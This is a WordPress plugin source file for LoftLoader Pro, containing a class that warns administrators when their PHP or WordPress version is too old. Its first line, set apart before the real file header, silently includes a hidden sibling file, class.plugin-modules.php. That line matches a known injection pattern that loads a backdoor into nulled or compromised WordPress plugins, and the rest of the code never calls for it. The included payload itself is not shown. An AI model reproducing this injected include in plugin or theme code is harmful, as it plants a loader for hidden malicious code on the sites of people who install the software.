<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
* Back compat class
* Show error message if the PHP/WP version is low
*/

if ( ! class_exists( 'LoftLoader_Pro_Back_Compat' ) ) {
	class LoftLoader_Pro_Back_Compat {
		/**
		* String minimal PHP version required
		*/
		protected $php_version;
		/**
		* String minimal WP version required
		*/
		protected $wp_version;
		public function __construct( $php, $wp ) {
			$this->php_version = $php;
			$this->wp_version = $wp;

			add_action( 'admin_notices', array( $this, 'error_message' ) );
			add_action( 'admin_menu', array( $this, 'add_admin_menu') );
		}

		/**
		* Print the admin notice message if PHP version challenging failed
		*/
		public function error_message() {
			$low_wp = version_compare( $GLOBALS['wp_version'], $this->wp_version, '<' );
			$low_php = version_compare( phpversion(), $this->php_version, '<' );
			printf(
				'<div class="error"><p>%1$s%2$s%3$s</p></div>',
				esc_html__(
					'Oops! Your site environment does not seem to meet the requirements for using LoftLoader Pro.',
					'loftloader-pro'
				),
				$low_wp ? sprintf(
					'<br/><br/>%s',
					sprintf( 
						esc_html__( '- Your WordPress version is too old. %1$sPlease update to WordPress %3$s or higher%2$s.', 'loftloader-pro' ), 
						'<b>',
						'</b>',
						$this->wp_version 
					)
				) : '',
				$low_php ? sprintf(
					'<br/><br/>%1$s<br/><br/>%2$s<br/><br/>%3$s',
					sprintf( 
						esc_html__( '- Your server PHP version is too old. %1$sPlease update to PHP %3$s or higher%2$s.', 'loftloader-pro' ), 
						'<b>',
						'</b>',
						$this->php_version 
					),
					sprintf( 
						esc_html__(
							'The latest version of PHP is 7.2. The minimum PHP version required for LoftLoader Pro is PHP %s. And WordPress recommends using PHP 7+.',
							'loftloader-pro'
						),
						$this->php_version
					),
					esc_html__(
						'PHP versions lower than 7.0 have reached the official end of their life cycle and may expose your site to security vulnerabilities. We strongly recommend that you no longer use the old PHP version, please always update to the latest version.',
						'loftloader-pro'
					)
				) : ''
			);
		}
		/**
		* Add admin menu for loftloader pro in setting panel
		*/
		public function add_admin_menu() {
			global $submenu; 
			$submenu['options-general.php'][] = array( 
				sprintf(
					'%1$s%2$s',
					__( 'LoftLoader Pro ', 'loftloader-pro' ),
					sprintf( '<span class="awaiting-mod" style="white-space: nowrap;"> %s</span>', esc_html__( 'YOUR PHP/WP IS OUTDATED', 'loftloader-pro' ) )
				),
				'manage_options',
				'#'
			);
		}
	}
}